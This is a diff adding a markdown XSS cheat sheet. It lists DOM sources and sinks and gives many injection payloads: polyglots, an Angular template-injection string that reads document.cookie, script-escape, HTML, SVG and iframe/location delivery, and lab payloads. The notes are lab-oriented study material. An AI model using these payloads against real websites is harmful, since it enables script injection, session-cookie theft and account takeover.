@@ -1,3 +1,107 @@
+
+## General how-to find XSS
+### DOM-based
+- Sources:
+  - document.URLUnencoded
+  - document.baseURI
+  - location
+  - document.cookie
+  - document.referrer
+  - window.name
+  - history.PushState
+  - history.replaceState
+  - localStorage
+  - IndexedDB
+  - Database
+- Sinks:
+  - document.write()
+  - window.location()
+  - document.cookie
+  - eval()
+  - document.domain
+  - WebSocket()
+  - element.src
+  - postMessage()
+  - setRequestHeader()
+  - FileReader.reafAsText()
+  - ExecuteSql()
+  - sessionStorage.setItem()
+  - document.evaluate()
+  - JSON.parse()
+  - element.setAttribute()
+  - RegExp()
+### Polyglots
+```html
+<>\'\"<script>{{7*7}}$(alert(1)}trevor
+```
+### Angular
+CSTI
+
+```html
+{{constructor.constructor('alert(document.cookie)')()}}
+```
+### Template literals
+```html
+${alert(1)}
+```
+### JS
+- it is possible to end current script tag:
+```html 
+</script><script>alert(1)</script>
+```
+- parentheses are blocker:
+```html 
+onerror=alert; throw 1
+```
+- escape string:
+```html
+'-alert(1)-'
+';alert(1)//
+\';alert(10//
+&apos;alert(1);//
+```
+### HTML
+- it is possible to create new HTML element:
+```html
+<script>alert(1)</script>
+<img src onerror=alert(1)>
+"><script>alert(1)</script>
+"><svg onload=alert(1)>
+```
+- custom tag:
+```html
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+```
+- svg:
+  - events are blocked (requires user interaction):
+```html
+<svg width="300" height="200"><a><animate attributeName="onclick" values="javascript:console.log(1)"></animate><text 
+x=150 y=100 text-anchor="middle">Click me</text></a></svg>
+```
+- svg:
+  - no user interaction:
+```html
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+- it is possible to use current element to trigger JS?
+```html
+" autofocus onfocus=alert(1) x="
+href="javascript:alert(1)"
+accesskey='X' onclick='alert(1)'
+```
+### Delivery
+- event is required
+```html
+<iframe src="PAYLOAD">
+```
+- event is not required:
+```html
+<script>
+location='URL'
+</script>
+```
+
+## LAB payloads
 ```html
 <script>alert(1)</script>
 '"><script>alert(1)</script>
